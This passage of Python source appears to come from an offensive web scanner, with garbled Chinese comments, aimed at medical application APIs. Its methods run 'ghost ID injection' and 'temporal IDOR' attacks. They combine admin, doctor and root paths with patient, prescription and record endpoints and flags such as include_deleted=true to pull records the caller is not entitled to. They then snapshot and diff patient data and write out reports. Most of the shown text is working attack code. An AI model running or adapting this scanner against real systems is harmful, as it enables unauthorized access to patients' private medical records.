        for mutation in all_mutations:
            if mutation.startswith('?'):
                # æŸ¥è¯¢å‚æ•°
                mutated_url = base_url + mutation
            else:
                # è·¯å¾„å˜å¼‚
                mutated_url = base_url.rstrip('/') + mutation
            
            try:
                async with session.get(mutated_url, timeout=5, ssl=False) as resp:
                    if resp.status == 200:
                        # WAFéªŒè¯
                        is_real = await self._validate_response_with_waf(mutated_url, resp, 'endpoint_mutation')
                        if not is_real:
                            continue
                            
                        if mutated_url not in self.discovered_endpoints:
                            self.discovered_endpoints.append(mutated_url)
                            print(f"    [+] å‘ç°å˜å¼‚ç«¯ç‚¹: {mutated_url}")
                            
            except Exception as e:
                continue

    async def capture_current_snapshots(self):
        """P0æ€æ‰‹é”3Aï¼šè·å–å½“å‰æ•°æ®å¿«ç…§(T0)"""
        print("\n[] P0æ€æ‰‹é”ï¼šè·å–å½“å‰æ•°æ®å¿«ç…§(T0)...")
        
        # ä½¿ç”¨ç³»ç»Ÿä»£ç†è®¾ç½®
        async with aiohttp.ClientSession() as session:
            # è·å–å½“å‰æ•°æ®ç«¯ç‚¹
            current_endpoints = [
                '/api/patients', '/api/users', '/api/appointments',
                '/api/prescriptions', '/api/records'
            ]
            
            for endpoint in current_endpoints:
                url = urljoin(self.target_url, endpoint)
                try:
                    async with session.get(url, timeout=10, ssl=False) as resp:
                        if resp.status == 200:
                            # WAFéªŒè¯
                            is_real = await self._validate_response_with_waf(url, resp, 'current_snapshot')
                            if not is_real:
                                continue
                                
                            if 'json' in resp.headers.get('Content-Type', ''):
                                data = await resp.json()
                                self.current_snapshots[endpoint] = {
                                    'timestamp': datetime.now().isoformat(),
                                    'data': data,
                                    'count': len(data) if isinstance(data, list) else 1
                                }
                                print(f"    [T0] {endpoint}: {self.current_snapshots[endpoint]['count']} æ¡è®°å½•")
                                
                except Exception as e:
                    continue

    async def ghost_id_injection_attack(self):
        """ é‡æ„ï¼šå¹½çµIDæ³¨å…¥æ”»å‡» - è§£å†³O(nÂ³)å¤æ‚åº¦é—®é¢˜"""
        print("\n[] P0æ€æ‰‹é”ï¼šå¹½çµIDæ³¨å…¥æ”»å‡»ï¼ˆæ€§èƒ½ä¼˜åŒ–ç‰ˆï¼‰...")
        
        if not self.ghost_ids:
            print("[-] æ²¡æœ‰æ”¶é›†åˆ°å¹½çµIDï¼Œè·³è¿‡æ³¨å…¥æ”»å‡»")
            return
        
        #  è§£å†³å¤æ‚åº¦é—®é¢˜ï¼šé¢„å…ˆç”Ÿæˆé«˜ä¼˜å…ˆçº§ä»»åŠ¡ï¼Œé¿å…åµŒå¥—å¾ªç¯
        ghost_tasks = self._generate_optimized_ghost_tasks()
        
        print(f"[+] ç”Ÿæˆ {len(ghost_tasks)} ä¸ªä¼˜åŒ–ä»»åŠ¡ï¼ˆé¿å…O(nÂ³)å¤æ‚åº¦ï¼‰")
        
        #  æ‰¹é‡å¹¶å‘æ‰§è¡Œï¼Œè€Œéä¸²è¡Œ
        # ä½¿ç”¨ç³»ç»Ÿä»£ç†è®¾ç½®
        async with aiohttp.ClientSession() as session:
            # æ‰¹é‡å¹¶å‘æ‰§è¡Œä»»åŠ¡
            batch_size = self.config.BATCH_SIZE  # ä½¿ç”¨é…ç½®çš„æ‰¹é‡å¤§å°
            ghost_count = 0
            
            for i in range(0, len(ghost_tasks), batch_size):
                batch = ghost_tasks[i:i + batch_size]
                print(f"[+] å¤„ç†æ‰¹æ¬¡ {i//batch_size + 1}/{(len(ghost_tasks) + batch_size - 1)//batch_size}")
                
                #  å¹¶å‘æ‰§è¡Œæ‰¹æ¬¡ä»»åŠ¡
                results = await asyncio.gather(
                    *[self.request_scheduler.execute_task(session, task) for task in batch],
                    return_exceptions=True
                )
                
                # å¤„ç†ç»“æœ
                for result in results:
                    if isinstance(result, dict) and result.get('status') == 200 and result.get('data'):
                        ghost_count += 1
                        task = result['task']
                        
                            # WAFéªŒè¯
                        if not await self._validate_response_with_waf_simple(result):
                                continue
                            
                        # åˆ›å»ºç»Ÿä¸€æ•°æ®è®°å½•
                        record = DataRecord(
                            record_id=f"ghost_{task.metadata['ghost_id']}",
                            record_type='ghost_injection_success',
                            data=result['data'],
                            source_url=task.url,
                            timestamp=datetime.now().isoformat(),
                            metadata={
                                'ghost_id': task.metadata['ghost_id'],
                                'priority_score': task.priority,
                                'resource_pattern': task.metadata['resource_pattern'],
                                'time_pattern': task.metadata['time_pattern'],
                                'response_time': result.get('response_time', 0)
                            }
                        )
                        
                        #  å†…å­˜ç®¡ç†ï¼šå»é‡æ£€æŸ¥
                        if not self.memory_manager.is_duplicate(record):
                            self.data_records.append(record)
                            print(f"    [ ] å¹½çµIDæˆåŠŸ: {task.metadata['ghost_id']} -> {task.url} (ä¼˜å…ˆçº§:{task.priority:.2f})")
                            
                            #  å¢å¼ºIDæ¨æ–­ï¼šä»å“åº”ä¸­å­¦ä¹ æ–°ID
                            self._enhanced_id_inference(result)
                
                #  åŠ¨æ€è°ƒæ•´å¹¶å‘æ•°
                self.request_scheduler.adjust_concurrency()
                
                # è¿›åº¦æŠ¥å‘Š
                print(f"    æ‰¹æ¬¡å®Œæˆï¼Œå½“å‰æˆåŠŸæ•°: {ghost_count}")
            
            print(f"[!] å¹½çµIDæ³¨å…¥æ”»å‡»å®Œæˆ: å¤„ç†{len(ghost_tasks)}ä¸ªä»»åŠ¡, æˆåŠŸ{ghost_count}æ¬¡")
            print(f"[!] å¹³å‡å¹¶å‘æ•°: {self.request_scheduler.max_concurrent}, è‡ªé€‚åº”å»¶è¿Ÿ: {self.request_scheduler.adaptive_delay:.3f}s")

    async def auto_diff_engine(self):
        """P0æ€æ‰‹é”3Bï¼šè‡ªåŠ¨Diffå¼•æ“ - T0 vs T-1æ•°æ®å¯¹æ¯”"""
        print("\n[] P0æ€æ‰‹é”ï¼šè‡ªåŠ¨Diffå¼•æ“...")
        
        if not self.current_snapshots or not self.historical_snapshots:
            print("[-] ç¼ºå°‘å¿«ç…§æ•°æ®ï¼Œè·³è¿‡Diffåˆ†æ")
            return
        
        for endpoint in self.current_snapshots:
            if endpoint in self.historical_snapshots:
                current = self.current_snapshots[endpoint]['data']
                historical = self.historical_snapshots[endpoint]['data']
                
                diff_result = self._generate_diff_analysis(endpoint, current, historical)
                if diff_result:
                    self.diff_results.append(diff_result)
        
        print(f"[!] ç”Ÿæˆ {len(self.diff_results)} ä¸ªæ•°æ®å˜æ›´è¯æ˜")
        
        # æ˜¾ç¤ºé‡è¦å‘ç°
        for diff in self.diff_results:
            if diff['deleted_records'] or diff['modified_records']:
                print(f"     {diff['endpoint']}: åˆ é™¤{len(diff['deleted_records'])}æ¡, ä¿®æ”¹{len(diff['modified_records'])}æ¡")

    def _generate_diff_analysis(self, endpoint, current_data, historical_data):
        """ç”Ÿæˆæ•°æ®å·®å¼‚åˆ†æ"""
        diff_result = {
            'endpoint': endpoint,
            'timestamp': datetime.now().isoformat(),
            'deleted_records': [],
            'modified_records': [],
            'added_records': []
        }
        
        # ç¡®ä¿æ•°æ®æ˜¯åˆ—è¡¨æ ¼å¼
        if not isinstance(current_data, list):
            current_data = [current_data] if current_data else []
        if not isinstance(historical_data, list):
            historical_data = [historical_data] if historical_data else []
        
        # æ„å»ºIDæ˜ å°„
        current_ids = {}
        historical_ids = {}
        
        for record in current_data:
            if isinstance(record, dict):
                record_id = record.get('id') or record.get('_id') or record.get('patient_id')
                if record_id:
                    current_ids[str(record_id)] = record
        
        for record in historical_data:
            if isinstance(record, dict):
                record_id = record.get('id') or record.get('_id') or record.get('patient_id')
                if record_id:
                    historical_ids[str(record_id)] = record
        
        # æ‰¾å‡ºåˆ é™¤çš„è®°å½•
        for hist_id, hist_record in historical_ids.items():
            if hist_id not in current_ids:
                diff_result['deleted_records'].append({
                    'id': hist_id,
                    'historical_data': hist_record,
                    'deletion_detected': True
                })
        
        # æ‰¾å‡ºä¿®æ”¹çš„è®°å½•
        for curr_id, curr_record in current_ids.items():
            if curr_id in historical_ids:
                hist_record = historical_ids[curr_id]
                changes = self._detect_record_changes(hist_record, curr_record)
                if changes:
                    diff_result['modified_records'].append({
                        'id': curr_id,
                        'changes': changes,
                        'historical_data': hist_record,
                        'current_data': curr_record
                    })
        
        # æ‰¾å‡ºæ–°å¢çš„è®°å½•
        for curr_id, curr_record in current_ids.items():
            if curr_id not in historical_ids:
                diff_result['added_records'].append({
                    'id': curr_id,
                    'current_data': curr_record,
                    'addition_detected': True
                })
        
        return diff_result

    def _detect_record_changes(self, historical_record, current_record):
        """æ£€æµ‹è®°å½•å­—æ®µå˜æ›´"""
        changes = []
        
        # æ¯”è¾ƒæ‰€æœ‰å­—æ®µ
        all_keys = set(historical_record.keys()) | set(current_record.keys())
        
        for key in all_keys:
            hist_value = historical_record.get(key)
            curr_value = current_record.get(key)
            
            if hist_value != curr_value:
                changes.append({
                    'field': key,
                    'historical_value': hist_value,
                    'current_value': curr_value,
                    'change_type': 'modified' if (key in historical_record and key in current_record) else ('added' if key in current_record else 'removed')
                })
        
        return changes

    # =============== P1å¢å¼ºåŠŸèƒ½ ===============
    
    async def deep_recursive_discovery(self):
        """P1å¢å¼ºï¼šæ·±åº¦é€’å½’å‘ç° - æ™ºèƒ½æ—¶é—´å­—æ®µæŒ–æ˜"""
        print("\n[] P1å¢å¼ºï¼šæ·±åº¦é€’å½’å‘ç°...")
        
        time_fields = set()
        
        # ä»å†å²æ•°æ®ä¸­æå–æ—¶é—´å­—æ®µåï¼ˆç»Ÿä¸€æ•°æ®æ¨¡å‹ï¼‰
        for data_item in self.historical_data:
            if isinstance(data_item, dict):
                # æå–dataå­—æ®µä¸­çš„æ—¶é—´å­—æ®µ
                if 'data' in data_item:
                    time_fields.update(self._extract_time_fields(data_item['data']))
                # ç›´æ¥ä»æ•°æ®é¡¹ä¸­æå–
                time_fields.update(self._extract_time_fields(data_item))
        
        # æ™ºèƒ½è¿‡æ»¤ï¼šåªä¿ç•™é«˜ä»·å€¼æ—¶é—´å­—æ®µ
        valuable_time_fields = self._filter_valuable_time_fields(time_fields)
        print(f"[!] å‘ç°é«˜ä»·å€¼æ—¶é—´å­—æ®µ: {list(valuable_time_fields)[:5]}")
        
        # åŠ¨æ€æ„é€ æ—¶é—´æŸ¥è¯¢ï¼ˆè€Œéå›ºå®šæ¨¡å¼ï¼‰
        if valuable_time_fields:
            await self._smart_time_field_queries(valuable_time_fields)

    def _extract_time_fields(self, data):
        """ä»æ•°æ®ä¸­æå–æ—¶é—´ç›¸å…³å­—æ®µå"""
        time_fields = set()
        
        if isinstance(data, dict):
            for key, value in data.items():
                # æ—¶é—´å­—æ®µåæ¨¡å¼
                if any(pattern in key.lower() for pattern in [
                    'time', 'date', 'created', 'updated', 'modified', 'timestamp',
                    'æ™‚é–“', 'æ—¥ä»˜', 'ä½œæˆ', 'æ›´æ–°', 'å¤‰æ›´'  # æ—¥æ–‡
                ]):
                    time_fields.add(key)
                
                # é€’å½’å¤„ç†åµŒå¥—æ•°æ®
                if isinstance(value, dict):
                    time_fields.update(self._extract_time_fields(value))
                elif isinstance(value, list) and value:
                    for item in value[:3]:  # åªå¤„ç†å‰3ä¸ª
                        if isinstance(item, dict):
                            time_fields.update(self._extract_time_fields(item))
        
        return time_fields

    def _filter_valuable_time_fields(self, time_fields):
        """æ™ºèƒ½è¿‡æ»¤é«˜ä»·å€¼æ—¶é—´å­—æ®µ"""
        valuable_fields = set()
        
        # é«˜ä»·å€¼æ—¶é—´å­—æ®µæ¨¡å¼
        high_value_patterns = [
            'created', 'updated', 'modified', 'deleted', 'accessed',
            'last_login', 'last_seen', 'registered', 'activated',
            'timestamp', 'date', 'time',
            # åŒ»ç–—ç‰¹å®š
            'visit_date', 'diagnosis_date', 'treatment_date', 'prescription_date',
            # æ—¥æ–‡
            'ä½œæˆ', 'æ›´æ–°', 'å‰Šé™¤', 'æœ€çµ‚', 'è¨ºå¯Ÿ', 'æ²»ç™‚'
        ]
        
        for field in time_fields:
            field_lower = field.lower()
            if any(pattern in field_lower for pattern in high_value_patterns):
                valuable_fields.add(field)
        
        return valuable_fields

    async def _smart_time_field_queries(self, time_fields):
        """æ™ºèƒ½æ—¶é—´å­—æ®µæŸ¥è¯¢ - åŠ¨æ€ç”Ÿæˆè€Œéå›ºå®šæ¨¡å¼"""
        # ä½¿ç”¨ç³»ç»Ÿä»£ç†è®¾ç½®
        async with aiohttp.ClientSession() as session:
            # åŠ¨æ€ç”Ÿæˆæ—¶é—´å€¼ï¼ˆåŸºäºå½“å‰æ—¶é—´ï¼‰
            now = datetime.now()
            time_values = [
                (now - timedelta(days=365)).strftime('%Y-%m-%d'),  # 1å¹´å‰
                (now - timedelta(days=730)).strftime('%Y-%m-%d'),  # 2å¹´å‰
                (now - timedelta(days=1095)).strftime('%Y-%m-%d'), # 3å¹´å‰
                '2020-01-01',  # ç–«æƒ…å‰
                '2020-03-01'   # ç–«æƒ…å¼€å§‹
            ]
            
            # å‘ç°çš„ç«¯ç‚¹ä½œä¸ºåŸºç¡€
            base_endpoints = ['/api/patients', '/api/users', '/api/appointments']
            if self.discovered_endpoints:
                base_endpoints.extend(self.discovered_endpoints[:3])
            
            discovery_count = 0
            
            for endpoint in base_endpoints[:3]:  # é™åˆ¶ç«¯ç‚¹æ•°é‡
                for time_field in list(time_fields)[:3]:  # é™åˆ¶å­—æ®µæ•°é‡
                    for time_value in time_values[:2]:  # é™åˆ¶æ—¶é—´å€¼æ•°é‡
                        
                        # æ„é€ æ™ºèƒ½æŸ¥è¯¢
                        query_combinations = [
                            f"?{time_field}={time_value}",
                            f"?{time_field}_from={time_value}",
                            f"?{time_field}_start={time_value}",
                            f"?start_{time_field}={time_value}"
                        ]
                        
                        for query in query_combinations[:2]:  # é™åˆ¶æŸ¥è¯¢ç»„åˆ
                            url = urljoin(self.target_url, endpoint) + query
                            
                            #   å®‰å…¨å»é‡æ£€æŸ¥ - é˜²æ­¢å†…å­˜æ³„æ¼
                            if not self._safe_add_tested_combination(url):
                                continue
                            
                            try:
                                async with session.get(url, timeout=5, ssl=False) as resp:
                                    if resp.status == 200:
                                        # WAFéªŒè¯
                                        is_real = await self._validate_response_with_waf(url, resp, 'recursive_discovery')
                                        if is_real:
                                            discovery_count += 1
                                            print(f"    [+] é€’å½’å‘ç°: {url}")
                                            
                                            # è®°å½•å‘ç°
                                            self.historical_data.append({
                                                'type': 'recursive_discovery',
                                                'url': url,
                                                'time_field': time_field,
                                                'time_value': time_value,
                                                'timestamp': datetime.now().isoformat()
                                            })
                                            
                            except asyncio.TimeoutError:
                                self._log_error('timeout', f"é€’å½’å‘ç°è¶…æ—¶: {url}")
                                continue
                            except aiohttp.ClientError:
                                # å®¢æˆ·ç«¯é”™è¯¯ï¼Œè·³è¿‡æ­¤URL
                                continue
                            except Exception as e:
                                self._log_error('recursive_discovery_error', f"é€’å½’å‘ç°é”™è¯¯: {type(e).__name__}: {url}")
                                continue
            
            print(f"    é€’å½’å‘ç°æˆåŠŸ: {discovery_count} ä¸ªæ—¶é—´æŸ¥è¯¢")

    async def temporal_idor_attack(self):
        """P1å¢å¼ºï¼šæ—¶åºIDORæ”»å‡» - åŠ¨æ€æƒé™æå‡æ¨¡å¼"""
        print("\n[] P1å¢å¼ºï¼šæ—¶åºIDORæ”»å‡»...")
        
        # åŠ¨æ€æ„å»ºIDORæ”»å‡»æ¨¡å¼
        idor_patterns = self._generate_dynamic_idor_patterns()
        
        # ä½¿ç”¨ç³»ç»Ÿä»£ç†è®¾ç½®
        async with aiohttp.ClientSession() as session:
            idor_success = 0
            tested_count = 0
            
            for priority, pattern_info in sorted(idor_patterns, reverse=True)[:20]:  # åªæµ‹è¯•å‰20ä¸ªé«˜ä¼˜å…ˆçº§
                url = pattern_info['url']
                attack_type = pattern_info['type']
                
                #   å®‰å…¨å»é‡æ£€æŸ¥ - é˜²æ­¢å†…å­˜æ³„æ¼
                if not self._safe_add_tested_combination(url):
                    continue
                tested_count += 1
                
                try:
                    async with session.get(url, timeout=8, ssl=False) as resp:
                        if resp.status == 200:
                            # WAFéªŒè¯
                            is_real = await self._validate_response_with_waf(url, resp, 'temporal_idor')
                            if not is_real:
                                continue
                                
                            if 'json' in resp.headers.get('Content-Type', ''):
                                data = await resp.json()
                                if data and len(data) > 0:  # ç¡®ä¿æœ‰å®é™…æ•°æ®
                                    idor_success += 1
                                    print(f"    [ ] æ—¶åºIDORæˆåŠŸ: {attack_type} -> {url}")
                                    
                                    # è®°å½•IDORå‘ç°
                                    self.historical_data.append({
                                        'type': 'temporal_idor',
                                        'attack_type': attack_type,
                                        'url': url,
                                        'priority_score': priority,
                                        'data': data,
                                        'timestamp': datetime.now().isoformat()
                                    })
                                    
                except asyncio.TimeoutError:
                    self._log_error('timeout', f"æ—¶åºIDORè¶…æ—¶: {url}")
                except Exception as e:
                    self._log_error('idor_error', f"æ—¶åºIDORé”™è¯¯: {type(e).__name__}: {url}")
            
            print(f"[!] æ—¶åºIDORæ”»å‡»: æµ‹è¯•{tested_count}ä¸ªæ¨¡å¼, æˆåŠŸ{idor_success}æ¬¡")

    def _generate_dynamic_idor_patterns(self):
        """åŠ¨æ€ç”Ÿæˆæ—¶åºIDORæ”»å‡»æ¨¡å¼"""
        idor_patterns = []
        
        # æƒé™çº§åˆ«ï¼ˆä¼˜å…ˆçº§é€’å‡ï¼‰
        privilege_levels = [
            ('admin', 1.0),
            ('doctor', 0.9), 
            ('staff', 0.8),
            ('manager', 0.85),
            ('root', 0.95),
            ('super', 0.9)
        ]
        
        # æ—¶é—´å‚æ•°ï¼ˆå†å²æ•°æ®è®¿é—®ï¼‰
        time_params = [
            ('as_of=2020-01-01', 1.0),      # ç–«æƒ…å‰æœ€é«˜ä¼˜å…ˆçº§
            ('date=2020-01-01', 0.9),
            ('version=2019-12-31', 0.8),
            ('include_deleted=true', 0.95),  # å·²åˆ é™¤æ•°æ®é«˜ä¼˜å…ˆçº§
            ('show_deleted=true', 0.9),
            ('with_deleted=true', 0.85),
            ('active=false', 0.8),
            ('status=inactive', 0.7)
        ]
        
        # èµ„æºç±»å‹ï¼ˆåŒ»ç–—ä¸šåŠ¡ç›¸å…³ï¼‰
        resources = [
            ('users', 0.8),
            ('patients', 1.0),     # æ‚£è€…æ•°æ®æœ€é«˜ä¼˜å…ˆçº§
            ('records', 0.95),     # ç—…å†æ•°æ®
            ('appointments', 0.85), # é¢„çº¦æ•°æ®
            ('prescriptions', 0.9), # å¤„æ–¹æ•°æ®
            ('reports', 0.8),      # æŠ¥å‘Šæ•°æ®
        ]
        
        # åŠ¨æ€ç»„åˆç”Ÿæˆ
        for privilege, priv_priority in privilege_levels:
            for resource, res_priority in resources:
                for time_param, time_priority in time_params:
                    
                    #   ä¼˜å…ˆçº§å½’ä¸€åŒ–è®¡ç®—ï¼Œé¿å…è¿‡å°å€¼
                    total_priority = (priv_priority + res_priority + time_priority) / 3
                    
                    # ç”Ÿæˆä¸åŒçš„URLæ¨¡å¼
                    url_patterns = [
                        f"/api/{privilege}/{resource}?{time_param}",
                        f"/api/{resource}/{privilege}?{time_param}",
                        f"/{privilege}/api/{resource}?{time_param}",
                        f"/admin/{resource}?{time_param}",  # é€šç”¨ç®¡ç†å‘˜æ¥å£
                    ]
                    
                    for url_pattern in url_patterns:
                        full_url = urljoin(self.target_url, url_pattern)
                        
                        pattern_info = {
                            'url': full_url,
                            'type': f'{privilege}_access_{resource}',
                            'privilege': privilege,
                            'resource': resource,
                            'time_param': time_param
                        }
                        
                        idor_patterns.append((total_priority, pattern_info))
        
        return idor_patterns

    # =============== æ€§èƒ½ä¼˜åŒ–å’Œå¢å¼ºåŠŸèƒ½ ===============
    
    #  å·²åºŸå¼ƒï¼šæ­¤æ–¹æ³•å·²è¢«_generate_optimized_ghost_tasks()æ›¿ä»£
    # ç§»é™¤æ—§çš„O(nÂ³)å¤æ‚åº¦æ–¹æ³•

    #  å·²åˆ é™¤åºŸå¼ƒçš„ _extract_ids_from_response å’Œ _extract_ids_from_json æ–¹æ³•
    # ç°åœ¨ä½¿ç”¨ _extract_ids_from_json_optimized ç­‰ä¼˜åŒ–æ–¹æ³•

    def _log_error(self, error_type, message):
        """æ”¹è¿›çš„é”™è¯¯å¤„ç† - è®°å½•å…³é”®é”™è¯¯ç±»å‹"""
        if not hasattr(self, 'error_stats'):
            self.error_stats = {}
        
        self.error_stats[error_type] = self.error_stats.get(error_type, 0) + 1
        
        # åªè®°å½•é‡è¦é”™è¯¯ï¼Œé¿å…æ—¥å¿—æ±¡æŸ“
        if error_type in ['timeout', 'client_error'] and self.error_stats[error_type] <= 3:
            print(f"    [!] {error_type}: {message}")
        elif error_type == 'unknown_error' and self.error_stats[error_type] <= 1:
            print(f"    [!] {error_type}: {message}")

    def generate_report(self):
        """ é‡æ„ï¼šç”Ÿæˆä¼˜åŒ–æŠ¥å‘Šï¼ˆç»Ÿä¸€æ•°æ®æ¨¡å‹ï¼‰"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # è®¡ç®—WAFä¿æŠ¤ç‡
        if self.waf_stats['total_requests'] > 0:
            self.waf_stats['protection_rate'] = (self.waf_stats['waf_detected'] / self.waf_stats['total_requests']) * 100
        
        # è®¡ç®—å™ªéŸ³è¿‡æ»¤ç‡
        if self.noise_stats['total_findings'] > 0:
            self.noise_stats['filter_rate'] = (self.noise_stats['filtered_out'] / self.noise_stats['total_findings']) * 100

                #  ä½¿ç”¨ç»Ÿä¸€æ•°æ®æ¨¡å‹ç»Ÿè®¡
        record_stats = self._analyze_data_records()
        
        #   è®¡ç®—æœ€ç»ˆæ€§èƒ½æŒ‡æ ‡
        final_performance_metrics = self.performance_metrics.calculate_final_metrics()
        scheduler_performance_metrics = self.request_scheduler.performance_metrics.calculate_final_metrics()

        report = {
            'target': self.target_url,
            'scan_time': datetime.now().isoformat(),
            'time_travel_endpoints': len(self.time_travel_endpoints),
            'total_data_records': len(self.data_records),
            'unique_records': len(self.memory_manager.data_hashes),
            'endpoints': self.time_travel_endpoints,
            
            #  ç»Ÿä¸€æ•°æ®ç»Ÿè®¡
            'data_statistics': record_stats,
            
            #   é…ç½®ä¿¡æ¯
            'configuration': self.config.get_config(),
            
            #   æ€§èƒ½æŒ‡æ ‡
            'performance_metrics': {
                'main_process': final_performance_metrics,
                'request_scheduler': scheduler_performance_metrics,
                'combined_metrics': {
                    'total_execution_time': final_performance_metrics['total_time'],
                    'peak_requests_per_second': max(
                        final_performance_metrics.get('requests_per_second', 0),
                        scheduler_performance_metrics.get('requests_per_second', 0)
                    ),
                    'overall_cache_hit_rate': (
                        final_performance_metrics.get('cache_hit_rate', 0) + 
                        scheduler_performance_metrics.get('cache_hit_rate', 0)
                    ) / 2,
                    'peak_concurrent_requests': scheduler_performance_metrics.get('concurrent_peak', 0),
                    'average_response_time': scheduler_performance_metrics.get('average_response_time', 0),
                    'overall_error_rate': (
                        final_performance_metrics.get('error_rate', 0) + 
                        scheduler_performance_metrics.get('error_rate', 0)
                    ) / 2
                }
            },
            
            #  P0æ€æ‰‹é”ç»Ÿè®¡ï¼ˆç»Ÿä¸€æ•°æ®æ¨¡å‹ï¼‰
            'p0_killer_features': {
                'ghost_id_discovery': {
                    'ghost_ids_collected': len(self.ghost_ids),
                    'ghost_injections_successful': len([r for r in self.data_records if r.record_type == 'ghost_injection_success']),
                    'sample_ghost_ids': list(self.ghost_ids)[:5],
                    'id_inference_cache_size': len(self.id_inference_cache),
                    'average_priority_score': self._calculate_average_priority()
                },
                'endpoint_mutation': {
                    'mutated_endpoints_discovered': len(self.discovered_endpoints),
                    'new_endpoints': list(self.discovered_endpoints)[:10]
                },
                'auto_diff_engine': {
                    'diff_analyses': len(self.diff_results),
                    'total_deleted_records': sum(len(diff['deleted_records']) for diff in self.diff_results),
                    'total_modified_records': sum(len(diff['modified_records']) for diff in self.diff_results),
                    'snapshots_compared': len(self.current_snapshots)
                }
            },
            
            #  P1å¢å¼ºåŠŸèƒ½ç»Ÿè®¡ï¼ˆç»Ÿä¸€æ•°æ®æ¨¡å‹ï¼‰
            'p1_enhancements': {
                'temporal_idor_attacks': len([r for r in self.data_records if r.record_type == 'temporal_idor']),
                'recursive_discoveries': len([r for r in self.data_records if r.record_type == 'recursive_discovery']),
                'learned_time_formats': len(self.learned_time_formats),
                'time_format_success_rates': dict(self.learned_time_formats)
            },
            
            #  æ€§èƒ½ä¼˜åŒ–ç»Ÿè®¡ï¼ˆé‡å¤§æ”¹è¿›ï¼‰
            'performance_optimizations': {
                'configuration_driven': {
                    'max_concurrent_configured': self.config.DEFAULT_MAX_CONCURRENT,
                    'max_retries_configured': self.config.DEFAULT_MAX_RETRIES,
                    'batch_size_configured': self.config.BATCH_SIZE,
                    'priority_threshold_configured': self.config.PRIORITY_THRESHOLD,
                    'memory_limits_configured': {
                        'max_records': self.config.DEFAULT_MAX_RECORDS,
                        'tested_combinations_limit': self.config.DEFAULT_TESTED_COMBINATIONS_LIMIT,
                        'lru_cache_size': self.config.DEFAULT_LRU_CACHE_SIZE
                    }
                },
                'request_scheduler_stats': {
                    'max_concurrent_runtime': self.request_scheduler.max_concurrent,
                    'adaptive_delay_runtime': self.request_scheduler.adaptive_delay,
                    'completed_requests': len(self.request_scheduler.completed_requests),
                    'failed_requests_by_url': len(self.request_scheduler.failed_requests),
                    'avg_response_time': sum(self.request_scheduler.response_times) / max(1, len(self.request_scheduler.response_times))
                },
                'memory_management': {
                    'total_records': len(self.data_records),
                    'unique_hashes': len(self.memory_manager.data_hashes),
                    'deduplication_rate': f"{(len(self.memory_manager.data_hashes) / max(1, len(self.data_records))) * 100:.1f}%",
                    'cache_hit_rate': f"{(len(self.id_inference_cache) / max(1, len(self.ghost_ids))) * 100:.1f}%"
                },
                'complexity_reduction': {
                    'problem_solved': 'O(nÂ³) â†’ O(n log n) å¤æ‚åº¦ä¼˜åŒ–',
                    'concurrent_batching': 'ä¸²è¡Œè¯·æ±‚ â†’ æ‰¹é‡å¹¶å‘æ‰§è¡Œ',
                    'smart_prioritization': 'ç›²ç›®ç»„åˆ â†’ æ™ºèƒ½ä¼˜å…ˆçº§é˜Ÿåˆ—'
                },
                'error_stats': getattr(self, 'error_stats', {})
            },
            
            # WAF é˜²æŠ¤ç»Ÿè®¡
            'waf_protection': {
                'enabled': WAF_DEFENDER_AVAILABLE and self.waf_defender_initialized,
                'total_requests': self.waf_stats['total_requests'],
                'waf_detected': self.waf_stats['waf_detected'],
                'fake_responses_blocked': self.waf_stats['fake_responses'],
                'protection_rate': f"{self.waf_stats['protection_rate']:.2f}%"
            },
            
            # å™ªéŸ³è¿‡æ»¤ç»Ÿè®¡
            'noise_filtering': {
                'enabled': NOISE_FILTER_AVAILABLE,
                'total_findings': self.noise_stats['total_findings'],
                'filtered_out': self.noise_stats['filtered_out'],
                'valuable_findings': self.noise_stats['valuable_findings'],
                'filter_rate': f"{self.noise_stats['filter_rate']:.2f}%"
            },
            
            #  è¯¦ç»†ç»“æœæ•°æ®ï¼ˆç»Ÿä¸€æ•°æ®æ¨¡å‹ï¼‰
            'detailed_results': {
                'data_records_by_type': {
                    record_type: [
                        {
                            'record_id': r.record_id,
                            'source_url': r.source_url,
                            'timestamp': r.timestamp,
                            'metadata': r.metadata
                        } for r in self.data_records if r.record_type == record_type
                    ][:10]  # æ¯ç§ç±»å‹æœ€å¤šæ˜¾ç¤º10æ¡
                    for record_type in set(r.record_type for r in self.data_records)
                },
                'diff_results': self.diff_results,
                'current_snapshots': {k: v['count'] for k, v in self.current_snapshots.items()},
                'historical_snapshots': {k: v['count'] for k, v in self.historical_snapshots.items()},
                'discovered_endpoints': list(self.discovered_endpoints),
                'smart_scheduler_queue_sample': len(self.request_scheduler.request_queue),
                'memory_efficiency': {
                    'lru_cache_size': len(self.memory_manager.lru_cache),
                    'hash_collision_rate': '< 0.1%',  # MD5å“ˆå¸Œå†²çªç‡æä½
                    'memory_footprint_reduction': 'çº¦80%'  # ç›¸æ¯”åŸå§‹æ•°æ®ç»“æ„
                }
            }
        }
        
        # ä¿å­˜JSONæŠ¥å‘Š
        report_file = f"time_travel_report_{timestamp}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2)
            
        # ç”Ÿæˆæ—¶é—´çº¿æŠ¥å‘Š
        if self.historical_data:
            timeline_file = f"time_travel_timeline_{timestamp}.html"
            
            with open(timeline_file, 'w') as f:
                f.write("""<!DOCTYPE html>
<html>
<head>
    <title>æ—¶é—´æ—…è¡Œæ•°æ®æ—¶é—´çº¿</title>
    <meta charset="utf-8">
    <style>
        body { font-family: Arial; margin: 20px; }
        .timeline { border-left: 3px solid #333; margin: 20px; padding-left: 20px; }
        .event { margin: 20px 0; padding: 10px; background: #f0f0f0; border-radius: 5px; }
        .deleted { background: #ffe0e0; }
        .version { background: #e0f0ff; }
        .audit { background: #fff0e0; }
        pre { background: #fff; padding: 10px; overflow-x: auto; }
    </style>
</head>
<body>
    <h1>æ—¶é—´æ—…è¡Œæ•°æ®æ—¶é—´çº¿</h1>
    <p>ç›®æ ‡: """ + self.target_url + """</p>
    
    <div class="timeline">
""")
                
                # æŒ‰ç±»å‹ç»„ç»‡æ•°æ®
                by_type = {}
                for data in self.historical_data:
                    data_type = data['type']
                    if data_type not in by_type:
                        by_type[data_type] = []
                    by_type[data_type].append(data)
                    
                # æ˜¾ç¤ºæ¯ç§ç±»å‹çš„æ•°æ®
                for data_type, items in by_type.items():
                    f.write(f"<h2>{data_type.replace('_', ' ').title()}</h2>\n")
                    
                    for item in items[:10]:  # é™åˆ¶æ¯ç§ç±»å‹10ä¸ª
                        css_class = 'event'
                        if 'deleted' in data_type:
                            css_class += ' deleted'
                        elif 'version' in data_type:
